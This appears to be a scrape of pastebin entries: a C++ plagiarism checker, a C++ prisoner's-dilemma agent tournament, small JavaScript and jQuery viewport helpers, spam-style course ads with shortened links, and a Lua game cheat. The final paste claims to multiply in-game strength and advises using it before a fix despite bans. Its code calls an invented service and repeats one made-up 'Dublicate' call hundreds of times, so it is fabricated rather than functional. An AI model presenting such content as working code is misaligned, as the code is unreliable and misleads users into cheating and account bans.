string read_text(string fname) {
    fstream Text_to_check;
    Text_to_check.open(fname, ios::in);
    string text_s;
    if (!Text_to_check.is_open()) {
        return text_s;
    }
    string s;
    while (!Text_to_check.eof()) {
        getline(Text_to_check, s);
        text_s += s;
        if (!Text_to_check.eof()) {
            text_s += ' ';
        }
    }
    Text_to_check.close();
    return text_s;
}

int main() {
    ios_base::sync_with_stdio(0);
    cin.tie(0);
    cout << setprecision(2);
    cout << fixed;
    setlocale(LC_ALL, ""RU"");
    string cmd = ""?"";
    string message = ""*****************************************\nСписок команд:\nquit - выход\nload_text - выбрать текст для проверки\n"";
    message += ""load_tests - загрузить тесты на плагиат\n? - справка\ncheck - проверить текст\n"";
    message += ""*****************************************\n"";
    string text = """";
    vector<string> tests = {};
    string error = ""Ошибка!\n"";
    bool txt = false;
    bool tst = false;
    int N = 0;
    while (cmd != ""quit"") {
        if (cmd == ""?"") {
            cout << message;
        }
        else if (cmd == ""load_text"") {
            try {
                cout << ""Введите имя файла с расширением: "";
                string x;
                cin >> x;
                text = read_text(x);
                if (text != """") {
                    N = text.size();
                    txt = true;
                }
                else {
                    cout << ""Файл пуст!\n"";
                }
            }
            catch (...) {
                cout << error;
            }
        }
        else if (cmd == ""load_tests"") {
            try {
                cout << ""Введите имя файла с расширением: "";
                string x;
                cin >> x;
                tests = read_tests(x);
                if (!tests.empty()) {
                    tst = true;
                }
                else {
                    cout << ""Файл пуст!\n"";
                }
            }
            catch (...) {
                cout << error;
            }
        }
        else if (cmd == ""check"") {
            if (txt and tst) {
                make_x_koefs(N + 1);
                vector <long long> h = make_polynom(text);
                long long len_same = 0;
                bool flag = true;
                vector<vector <long long>> testsll;
                for (auto now : tests) {
                    if (now.size() > N) {
                        cout << ""Тест длиннее текста!\n"";
                        flag = false;
                        break;
                    }
                    testsll.push_back(make_polynom(now));
                }
                text = "" "" + text;
                for (int i = 1; i < text.size(); i++) {
                    for (int j = 0; j < testsll.size(); j++) {
                        if (i + testsll[j].size() - 1 <= text.size()) {
                            if (isequal(i, 1, testsll[j].size() - 1, h, x, testsll[j])) {
                                len_same += testsll[j].size() - 1;
                            }
                        }
                    }
                }
                cout << ""Процент плагиата:"" << (long double)len_same / (text.size() - 1) * 100 << ""%\n"";
            }
            else {
                cout << ""Не выбран текст или тесты!\n"";
            }
        }
        else {
            cout << error;
        }
        cin >> cmd;
    }
}"
yiCdmF2B,game theory ArktinuAgent,Kaelygon,C++,Sunday 24th of December 2023 09:32:19 AM CDT,"#include <iostream>
#include <vector>
#include <cstdlib>
#include <ctime>
#include <climits>
#include <algorithm>
#include <cmath>
#include <iostream>
#include <iomanip>  // Include for setw

class Agent {
public:
	int lastDecision = -1;  // opponents last decision
	uint score=0;
	uint victories=0;

	virtual bool makeDecision() = 0; //true = split, false = defy
    virtual Agent* clone() const = 0;
    virtual ~Agent() = default;
};

class SplitterAgent : public Agent {
public:
	bool makeDecision() {
		return true;  // Always choose to split
	}
    SplitterAgent* clone() const override {
        return new SplitterAgent(*this);
    }
};

class DefierAgent : public Agent {
public:
	bool makeDecision() {
		return false;  // Always choose to defy
	}
    DefierAgent* clone() const override {
        return new DefierAgent(*this);
    }	
};

class RandomAgent : public Agent {
public:
	bool makeDecision() {
		return rand() % 2 == 0;  // Randomly choose to split or defy
	}
    RandomAgent* clone() const override {
        return new RandomAgent(*this);
    }
};

class TitForTatAgent : public Agent {
public:
	bool makeDecision() {
		// Copy opponent's last decision
		if (lastDecision!=-1) {
			return lastDecision;
		}
		return true;
	}
    TitForTatAgent* clone() const override {
        return new TitForTatAgent(*this);
    }
};

class GenerousTFTAgent : public Agent {
public:
    bool makeDecision() override {
        if (lastDecision == -1) {
            return true; // Start with cooperation
        } else {
            // Mimic opponent's previous move
            return lastDecision || (rand() % 100 < forgivenessProbability);
        }
    }

    GenerousTFTAgent* clone() const override {
        return new GenerousTFTAgent(*this);
    }

private:
    const int forgivenessProbability = 10; // Adjust as needed
};

class AlternateAgent : public Agent {
private:
    bool splitNextRound;  // Flag to alternate between splitting and defying

public:
    AlternateAgent() : splitNextRound(true) {}

    bool makeDecision() {
        splitNextRound = !splitNextRound;  // Alternate decision in each round
        return splitNextRound;
    }

    AlternateAgent* clone() const override {
        return new AlternateAgent(*this);
    }
};

class PatternAgent : public Agent {
private:
	uint index=0;
	std::vector<uint> pattern=
	{
		0,1,1,0,1,1,0,1,1,0,0
	};
public:

    bool makeDecision() {
        return pattern[index++%pattern.size()];
    }

    PatternAgent* clone() const override {
        return new PatternAgent(*this);
    }
};

class GrudgeAgent : public Agent {
public:
    bool makeDecision() override {
        if(lastDecision==-1){
			hasGrudge=false;
			return true;
		}
		if( lastDecision == false || hasGrudge ){
			hasGrudge=true;
		}
        return true*!hasGrudge;  // Cooperate by default
    }

    GrudgeAgent* clone() const override {
        return new GrudgeAgent(*this);
    }

private:
    bool hasGrudge = false;
};

//simpler but similar to ArktinuAgent
class KindExploitAgent : public Agent {
private:
	std::vector<bool> opponentHistory;
	double recentAvg=0.8;
	double longTermAvg=0.8;
	uint recentSize=7;
	bool opponentAlwaysSplit=1;
	bool opponentAlwaysDefy=1;
	uint ogRecentSize = recentSize; //original recent size
	uint round=0;
public:

    bool makeDecision() {
		round++;
		if (lastDecision==-1){
			recentAvg=0.8;
			opponentAlwaysSplit=1;
			opponentAlwaysDefy=1;
			round=0;
			opponentHistory.clear();
			return 1;
		}
		opponentHistory.push_back(lastDecision);

		recentSize = round<ogRecentSize ? round : ogRecentSize; //short term average size

		//averages
		longTermAvg=(longTermAvg+lastDecision)/2.0;
		if(lastDecision==0){opponentAlwaysSplit=0;}
		if(lastDecision==1){opponentAlwaysDefy=0;}
		for(int i=0;i<recentSize;i++){
			recentAvg+=opponentHistory[round-i-1];
		}
		recentAvg/=recentSize;

		if(opponentAlwaysSplit && longTermAvg>0.9999){ //exploitable
			return 0;
		}
		if(opponentAlwaysDefy && longTermAvg<0.1){
			return 0;
		}
		if(recentAvg>0.7){
			return 1;
		}
		if(recentAvg<0.3){
			return 0;
		}
		return lastDecision;		
    }

    KindExploitAgent* clone() const override {
        return new KindExploitAgent(*this);
    }
};

class ArktinuAgent : public Agent {
public:

	bool makeDecision() {
		++round;
		if (lastDecision==-1) { //new game was started
			round=0;
			recentAvg=0.5;
			longTermAvg=0.4;
			parley=0;
			parleyAttempts=0;
			opponentAlwaysSplit=1;
			opponentAlwaysDefy=1;
			noProfitBetrayal=0;
			opponentHistory.clear();

			bool rnum = kaelRand() > UINT_MAX/9; //11% chance false
			if(!rnum){//we didn't start nicely
				startedBetrayal=2;
			}
			return true;
		}
		opponentHistory.push_back(lastDecision);
		ogRecentSize = round/48 > ogRecentSize ? round/48+1 : ogRecentSize; //scale with game length

		if(parley>0){
			parley--;
			return 1;
		}

		recentSize = round<ogRecentSize ? round : ogRecentSize; //short term average size
		recentAvg=0;

		//averages
		longTermAvg=(longTermAvg+lastDecision)/2.0;
		if(lastDecision==0){opponentAlwaysSplit=0;}
		if(lastDecision==1){opponentAlwaysDefy=0;}
		for(int i=0;i<recentSize;i++){
			recentAvg+=opponentHistory[round-i-1];
		}
		recentAvg/=recentSize;

		//long terms
		if(longTermAvg>( ((double)round*0.84)/round ) && noProfitBetrayal>round*0.009){//trust worthy but not exploitable
			return 1;
		}
		if(longTermAvg>0.995 && opponentAlwaysSplit){ //opponent is extremely co-operative. Exploit
			return 0;
		}
		if(longTermAvg<0.025 && opponentAlwaysDefy){ //opponent is not co-operative at all. Lose trust
			return 0;
		}

		startedBetrayal-=startedBetrayal>0; //betrayal cooldown
		if(startedBetrayal>0){ 
			if(startedBetrayal==recentSize){ //don't betray twice in row
				return 1;
			}
			noProfitBetrayal+=!lastDecision;
			if(recentAvg<0.62){startedBetrayal=0; return 1;} //backfired; cancel
			//continue betrayal if it is tolerated
			//if opponent doesn't tolerate betrayal there's higher chance returning true because we started betrayal
			return kaelRand() < (UINT_MAX*recentAvg);
		}
		
		//recent 
		if(recentAvg>=(1-1.0/ogRecentSize) && startedBetrayal==0){ //opponent is very co-operative. Test if exploiting a little is tolerated
			startedBetrayal=recentSize*0.75+1;
			return 0;
		}
		if(recentAvg>=0.52){ //opponent is mostly co-operative
			parleyAttempts -= (kaelRand() > (UINT_MAX/5)) * (parleyAttempts>0); //20% chance to forgive failed parley attempts
			return kaelRand() > (UINT_MAX*(recentAvg*0.9975)); //slightly lower chance to return true than opponent's recent average
		}
		if( recentAvg<(2.0/ogRecentSize) ){ //opponent is not co-operative
			if(kaelRand() < (UINT_MAX/(20*(parleyAttempts+1))) ){//5% chance parley. decreases by past parley count
				parleyAttempts++;
				parley=recentSize*1.25; //return true for next few rounds to test opponent
				parley-=parley>0;
				return 1;
			} 
			return 0;
		}

		//similar to tit for tat when recentAvg is between recentAvg<(2.0/ogRecentSize) to 0.52
		uint fraction = (UINT_MAX*recentAvg);
		uint rnum = kaelRand();
		if(!lastDecision){
			fraction=fraction*0.235; //much lower chance if opponent's previous value was false
		}else{
			//fraction=fraction*0.95; //slightly lower
			rnum=rnum/1.05; //higher 		
		}
		bool retval = rnum < fraction;
		return retval;
	}

    ArktinuAgent* clone() const override {
        return new ArktinuAgent(*this);
    }

private:

	std::vector<bool> opponentHistory;
	uint noProfitBetrayal=0;
	double recentAvg=0.5;
	double longTermAvg=0.5;
	bool opponentAlwaysSplit=1;
	bool opponentAlwaysDefy=1;
	int parley=0;
	uint parleyAttempts=0;
	uint recentSize = 7;
	uint ogRecentSize = recentSize; //original past size
	uint round = 0;

	int startedBetrayal=0;
	uint seed=13238717;
    uint kaelRand(){
		seed = ((seed >> 9) | (seed << 23))*7+3;
		//std::cout << seed << ""\n"";
		return seed;
	}
};

void playRound(Agent& agent1, Agent& agent2) {
	bool decision1 = agent1.makeDecision();
	bool decision2 = agent2.makeDecision();

	if (decision1 && decision2) {
		// Both agents split
		agent1.score+=3;
		agent2.score+=3;
	} else 
	if (decision1 && !decision2) {
		// Agent 2 defies, agent 1 splits
		agent1.score+=1;
		agent2.score+=5;
	} else 
	if (!decision1 && decision2) {
		// Agent 1 defies, agent 2 splits
		agent1.score+=5;
		agent2.score+=1;
	} else 
	if (!decision1 && !decision2) {
		// Both agents defy
		agent1.score+=1;
		agent2.score+=1;
	}

//	if(rand()%100==0){ //1% noise
//		decision2=rand()%2;
//		decision1=rand()%2;
//	}

	agent1.lastDecision=decision2; //pass opposing agent decisions
	agent2.lastDecision=decision1;
}

// Comparison function for sorting agents based on score
bool compareAgents(const Agent* a, const Agent* b) {
    return a->score > b->score;
}

int main() {
	srand(time(NULL));
	//srand(124);

	SplitterAgent splitter;
	DefierAgent defier;
	RandomAgent randomAgent;
	TitForTatAgent titForTat;
	ArktinuAgent arktinu;
	GrudgeAgent grudge;
	AlternateAgent alternate;
	PatternAgent pattern;
	KindExploitAgent kindExploit;
	GenerousTFTAgent generousTFT;

	Agent* agents[] = {&splitter, &defier, &randomAgent, &grudge, &alternate, &pattern, &kindExploit, &generousTFT, &titForTat, &arktinu};
	const int numAgents = sizeof(agents) / sizeof(agents[0]);

	for(int tournaments=0;tournaments<10;tournaments++){

		int totalRounds = 200+(rand()%100-50);

		// Play each agent against every other agent
		for (int i = 0; i < numAgents; ++i) {
			for (int j = 0; j < numAgents; ++j) {
				Agent* opponentAgent = agents[j];
				if(i==j){
					opponentAgent = agents[j]->clone();
				}

				uint agent1Score = agents[i]->score; //starting score
				uint agent2Score = opponentAgent->score;
				agents[i]->lastDecision=-1; //clear for new game
				opponentAgent->lastDecision=-1;
				
				std::string agent1History;
				std::string agent2History;
				for (int round = 0; round < totalRounds; ++round) {
					playRound(*agents[i], *opponentAgent);
					if(totalRounds-round<50){
						agent1History+=std::to_string(opponentAgent->lastDecision);
						agent2History+=std::to_string(agents[i]->lastDecision);
					}
				}

				agent1Score = agents[i]->score - agent1Score; //difference to get this game score
				agent2Score = opponentAgent->score - agent2Score;

				
				if(agent1Score>agent2Score){ //nobody wins on tie
					agents[i]->victories++;
				}else if(agent1Score<agent2Score){
					agents[j]->victories++;
				}

				if(tournaments==0){
					std::cout << agent1History << "" "" << typeid(*agents[i]).name() << "" "" << agent1Score << ""\n"";
					std::cout << agent2History << "" "" << typeid(*agents[j]).name() << "" "" << agent2Score << ""\n\n"";
				}
				
			}
		}

	}

	// Display combined end results
	uint longestName = 0;
	uint longestWins = 0;
	uint longestPoints = 0;
	uint highestScore=0;
	for (int i = 0; i < numAgents; ++i) {
		std::string nameStr = typeid(*agents[i]).name();
		if (nameStr.length() > longestName) {
			longestName = nameStr.length();
		}
		if ((std::to_string(agents[i]->score).length()) > longestPoints) {
			longestPoints = (std::to_string(agents[i]->score).length());
		}
		if ((std::to_string(agents[i]->victories).length()) > longestWins) {
			longestWins = (std::to_string(agents[i]->victories).length());
		}
	}

    std::sort(agents, agents + numAgents, compareAgents);

	for (int i = 0; i < numAgents; ++i) {
		std::string nameStr = typeid(*agents[i]).name();

		// Use setw to set the field width
		std::cout 	<< std::setw(longestName) 	<< nameStr 				<< ""  wins: ""
					<< std::setw(longestWins) 	<< agents[i]->victories << ""  points: ""
					<< std::setw(longestPoints) << agents[i]->score 	<< "" \n"";
	}

	return 0;
}"
pNSGx7jr,Untitled,sissou123,C++,Sunday 24th of December 2023 09:32:10 AM CDT,"Unreal Engine 5 C++ Developer: Learn C++ & Make Video Games
Created in collaboration with Epic Games. Learn C++ from basics while making your first 5 video games in Unreal 
for more:https://cuty.io/dEmfgi0
"
bET0PCJU,isInViewport.js,salmancreation,JavaScript,Sunday 24th of December 2023 09:24:28 AM CDT,"/*!
 * Determine if an element is in the viewport
 * (c) 2017 Chris Ferdinandi, MIT License, https://gomakethings.com
 * @param  {Node}    elem The element
 * @return {Boolean}      Returns true if element is in the viewport
 */
var isInViewport = function (elem) {
	var distance = elem.getBoundingClientRect();
	return (
		distance.top >= 0 &&
		distance.left >= 0 &&
		distance.bottom <= (window.innerHeight || document.documentElement.clientHeight) &&
		distance.right <= (window.innerWidth || document.documentElement.clientWidth)
	);
};"
NRj2JrkY,detect when an element is fully visible then do whatever,salmancreation,jQuery,Sunday 24th of December 2023 09:22:47 AM CDT,"This is what I use to detect when an element is fully visible then do whatever I want with it:

// Create jQuery Method
jQuery.fn.isFullyVisible = function(){

var win = $(window);

var viewport = {
    top : win.scrollTop(),
    left : win.scrollLeft()
};
viewport.right = viewport.left + win.width();
viewport.bottom = viewport.top + win.height();

var elemtHeight = this.height();// Get the full height of current element
elemtHeight = Math.round(elemtHeight);// Round it to a whole number

var bounds = this.offset();// Coordinates of current element
bounds.top = bounds.top + elemtHeight;
bounds.right = bounds.left + this.outerWidth();
bounds.bottom = bounds.top + this.outerHeight();

return (!(viewport.right < bounds.left || viewport.left > bounds.right || viewport.bottom < bounds.top || viewport.top > bounds.bottom));

}

//Usage:
$(window).on('scroll', function() {
  if( $('.tailor .content').isFullyVisible() ){
    // do something
  }
});"
1JguKSxs,Untitled,sissou123,C#,Sunday 24th of December 2023 09:22:02 AM CDT,"Complete C# Unity Game Developer 3D
Design & Develop Video Games. Learn C# in Unity Engine. Code Your first 3D Unity games for web, Mac & PC 
for more:https://cuty.io/tV1TBgiq7
"
w5QqiiS6,Untitled,sissou123,C#,Sunday 24th of December 2023 09:14:43 AM CDT,"RPG Core Combat Creator: Learn Intermediate Unity C# Coding
Build Combat for Role Playing Game (RPG) in Unity. Tutorials Cover Code Architecture & Video Game Design. 
for more:https://cuty.io/DzyX3shYeL6i
"
bXUigVsf,"SPTS ENDLESS INF STRENGTH, V2 AND NO SCAM!",whileDo,Lua,Sunday 24th of December 2023 09:14:12 AM CDT,"-- explain: The game have tickApproat 1\1000, basically it freezee game and update tick for 1k time, but chance to this 0.1%, literally, if u have 1 it dublicated to 1000, if u have 1m, it dublicated to 1B, but im sayed, chance only 0.1%. dont change the code, theres 1k strings, it dont work if there 1001 string form dublicate, the RekQtelJpjgo29 obsufcated by Repa v3 code, it so op, just put autoexec and change the liad to 333,1,2 and u have 1k executed, basically, if u have normal luck, it dublicate u, but chance not 100%. im have 11Qui, but im got banned, dont use it so much. use it before fix, and yes, if u want not bt, im can obsufcate strength, physic, but Repa v3 work at 11k strings per second. im need grind for week to find obsufcate. good cheating
local bt = Game:GetService(""BodyTou23gfjmads"")
bt.Get.Place(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
